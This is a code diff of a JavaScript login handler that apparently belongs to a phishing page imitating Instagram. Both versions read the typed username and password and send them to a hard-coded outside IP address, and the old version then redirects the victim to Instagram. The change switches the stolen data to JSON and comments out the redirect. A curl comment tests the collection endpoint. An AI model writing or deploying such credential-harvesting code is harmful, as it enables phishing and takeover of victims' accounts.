@@ -32,16 +32,16 @@ function activateLoginButton() {
 function logInOnClick() {
     var usernameInputText = document.getElementById("username-input-box").value;
     var passwordInputText = document.getElementById("password-input-box").value;
-    const xhr = new XMLHttpRequest();
-    xhr.open("POST", "http://23.233.39.254:3000/userinfo", true);
-    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
-    xhr.send("username=" + usernameInputText + "&password=" + passwordInputText);
-    xhr.onreadystatechange = (e) => {
-        console.log("bruh");
-    }
-    alert(usernameInputText + ", " + passwordInputText);
-    
-    document.location.href = "instagram.com";
+    var data = {
+        username: usernameInputText,
+        password: passwordInputText
+    };
+    var xhr = new window.XMLHttpRequest();
+    xhr.open('POST', 'http://23.233.39.254:3000/userinfo', true);
+    xhr.setRequestHeader('Content-Type', 'application/json;charset=UTF-8')
+    xhr.send(JSON.stringify(data))
+    console.log(usernameInputText + ", " + passwordInputText);
+    // document.location.href = "instagram.com";
 
     /*
     curl --header "Content-Type: application/json" --request POST --data '{"username":"xyz","password":"xyz"}' http://23.233.39.254:3000/userinfo
